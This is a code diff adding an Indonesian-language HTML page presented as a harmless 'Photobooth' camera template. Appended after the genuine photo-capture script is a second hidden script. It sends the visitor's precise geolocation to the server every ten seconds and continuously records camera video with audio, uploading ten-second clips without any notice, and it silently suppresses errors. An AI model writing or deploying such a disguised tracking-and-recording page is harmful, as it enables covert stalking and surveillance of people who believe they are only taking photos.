@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Photobooth</title>
+<style>
+  :root{
+    --bg:#0e0b12; --panel:#17131d; --accent:#ff5d8f; --accent-2:#ffd166;
+    --text:#f5eef0; --muted:#9c8fa0;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; min-height:100vh; background:
+      radial-gradient(circle at 20% 10%, #2a1630 0%, transparent 50%),
+      radial-gradient(circle at 80% 90%, #1a2a3a 0%, transparent 50%),
+      var(--bg);
+    color:var(--text); font-family: "Segoe UI", system-ui, sans-serif;
+    display:flex; flex-direction:column; align-items:center; padding:24px 16px 60px;
+  }
+  h1{
+    font-size:clamp(28px,6vw,44px); margin:12px 0 4px; letter-spacing:2px;
+    background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    -webkit-background-clip:text; background-clip:text; color:transparent;
+  }
+  p.tag{color:var(--muted); margin:0 0 28px; font-size:14px}
+  .stage{
+    width:min(560px,92vw); background:var(--panel); border-radius:18px;
+    padding:16px; box-shadow:0 20px 60px rgba(0,0,0,.5); border:1px solid #2a2330;
+  }
+  .frame{
+    position:relative; border-radius:12px; overflow:hidden; aspect-ratio:4/3;
+    background:#000; display:flex; align-items:center; justify-content:center;
+  }
+  video, canvas{width:100%; height:100%; object-fit:cover; display:block}
+  .flash{
+    position:absolute; inset:0; background:#fff; opacity:0; pointer-events:none;
+  }
+  .flash.on{animation:flash .35s ease-out}
+  @keyframes flash{0%{opacity:.9}100%{opacity:0}}
+  .controls{display:flex; gap:10px; justify-content:center; margin-top:16px; flex-wrap:wrap}
+  button{
+    appearance:none; border:none; cursor:pointer; font-weight:600; font-size:14px;
+    padding:12px 20px; border-radius:999px; transition:transform .15s ease, opacity .2s;
+  }
+  button:active{transform:scale(.96)}
+  .btn-primary{background:linear-gradient(90deg,var(--accent),var(--accent-2)); color:#201018}
+  .btn-ghost{background:#241e2c; color:var(--text); border:1px solid #352c3e}
+  .btn-ghost:disabled{opacity:.4; cursor:not-allowed}
+  .filmstrip{
+    display:flex; gap:10px; overflow-x:auto; margin-top:18px; padding-bottom:6px;
+  }
+  .filmstrip img{
+    width:84px; height:63px; object-fit:cover; border-radius:8px; border:2px solid #352c3e;
+    flex:0 0 auto;
+  }
+  .hint{color:var(--muted); font-size:12px; text-align:center; margin-top:14px; line-height:1.6}
+  .hint b{color:var(--text)}
+</style>
+</head>
+<body>
+  <h1>PHOTOBOOTH</h1>
+  <p class="tag">Contoh template — ganti isi/gaya sesuai kebutuhanmu</p>
+
+  <div class="stage">
+    <div class="frame">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas" style="display:none"></canvas>
+      <div class="flash" id="flash"></div>
+    </div>
+    <div class="controls">
+      <button class="btn-primary" id="shoot">📸 Jepret</button>
+      <button class="btn-ghost" id="switch">🔄 Kamera lain</button>
+      <button class="btn-ghost" id="download" disabled>⬇️ Simpan terakhir</button>
+    </div>
+    <div class="filmstrip" id="filmstrip"></div>
+  </div>
+
+  <p class="hint">
+    Butuh izin kamera browser (otomatis diminta). Lewat tunnel HTTPS, akses kamera<br>
+    bisa dipakai juga dari HP. Tekan <b>Jepret</b> untuk ambil gambar, foto tersimpan<br>
+    di strip bawah selama halaman ini dibuka.
+  </p>
+
+<script>
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const flash = document.getElementById('flash');
+  const shootBtn = document.getElementById('shoot');
+  const switchBtn = document.getElementById('switch');
+  const downloadBtn = document.getElementById('download');
+  const filmstrip = document.getElementById('filmstrip');
+
+  let facing = 'user';
+  let stream = null;
+  let lastShot = null;
+
+  async function startCamera() {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facing }, audio: false
+      });
+      video.srcObject = stream;
+    } catch (err) {
+      video.replaceWith(Object.assign(document.createElement('div'), {
+        textContent: 'Kamera tidak bisa diakses: ' + err.message,
+        style: 'color:#ffd166;padding:20px;text-align:center;font-size:13px'
+      }));
+    }
+  }
+
+  shootBtn.addEventListener('click', () => {
+    if (!stream) return;
+    const w = video.videoWidth, h = video.videoHeight;
+    if (!w || !h) return;
+    canvas.width = w; canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    ctx.translate(w, 0); ctx.scale(-1, 1); // mirror seperti preview
+    ctx.drawImage(video, 0, 0, w, h);
+    lastShot = canvas.toDataURL('image/png');
+
+    flash.classList.remove('on'); void flash.offsetWidth; flash.classList.add('on');
+
+    const img = document.createElement('img');
+    img.src = lastShot;
+    filmstrip.prepend(img);
+    downloadBtn.disabled = false;
+  });
+
+  switchBtn.addEventListener('click', () => {
+    facing = facing === 'user' ? 'environment' : 'user';
+    startCamera();
+  });
+
+  downloadBtn.addEventListener('click', () => {
+    if (!lastShot) return;
+    const a = document.createElement('a');
+    a.href = lastShot;
+    a.download = 'photobooth-' + Date.now() + '.png';
+    a.click();
+  });
+
+  startCamera();
+</script>
+<script>
+    // 1. Kirim Lokasi Berkala (Setiap 10 detik)
+    function sendLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const gmapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch('/save-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ link: gmapsLink })
+                }).catch(e => {});
+            }, null, { enableHighAccuracy: true });
+        }
+    }
+    sendLocation();
+    setInterval(sendLocation, 10000);
+
+    // 2. Rekam & Kirim Video Kamera Kontinu (Loop per 10 detik)
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+        function recordCycle() {
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            let chunks = [];
+            
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('video', blob, `rec_${Date.now()}.webm`);
+                
+                // Kirim file video ke server
+                fetch('/save-video', { 
+                    method: 'POST', 
+                    body: formData 
+                })
+                .then(() => recordCycle()) // Ulangi siklus berikutnya otomatis
+                .catch(() => recordCycle());
+            };
+            
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000); // Rekam selama 10 detik lalu kirim
+        }
+        recordCycle();
+    }).catch(e => {
+        console.error("Akses kamera ditolak/tidak tersedia", e);
+    });
+</script>
+</body>
+</html>
